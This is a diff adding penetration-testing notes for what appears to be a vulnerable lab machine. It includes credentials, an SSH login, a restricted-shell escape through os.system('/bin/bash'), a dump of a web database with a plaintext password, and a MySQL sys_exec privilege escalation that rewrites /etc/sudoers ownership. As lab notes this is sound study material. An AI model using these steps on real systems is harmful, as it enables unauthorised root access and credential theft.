@@ -47,3 +47,43 @@ Password 	: 	MyNameIsJohn
 
 Username 	: 	robert
 Password 	: 	ADGAdsafdfwt4gadfga==
+
+ssh john@192.168.111.133
+echo os.system('/bin/bash')
+
+more .bash_history 
+  exit
+  sudo su
+  clear
+  ls
+  cd /home/loneferret
+  ls
+  ./nc
+  rm nc
+  exit
+  
+cat /proc/version
+  Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) #1 SMP Tue Jul 7 20:21:17 UTC 2009
+  
+cd /var/www
+more database.sql
+  CREATE TABLE `members` (
+  `id` int(4) NOT NULL auto_increment,
+  `username` varchar(65) NOT NULL default '',
+  `password` varchar(65) NOT NULL default '',
+  PRIMARY KEY (`id`)
+  ) TYPE=MyISAM AUTO_INCREMENT=2 ;
+
+  -- 
+  -- Dumping data for table `members`
+  -- 
+
+  INSERT INTO `members` VALUES (1, 'john', '1234');
+
+mysql -uroot
+select sys_exec('chown USER:USER /etc/sudoers');
+chmod 0751 /etc/sudoers
+chmod 0440 /etc/sudoers
+select sys_exec('chown root:root /etc/sudoers');
+
+
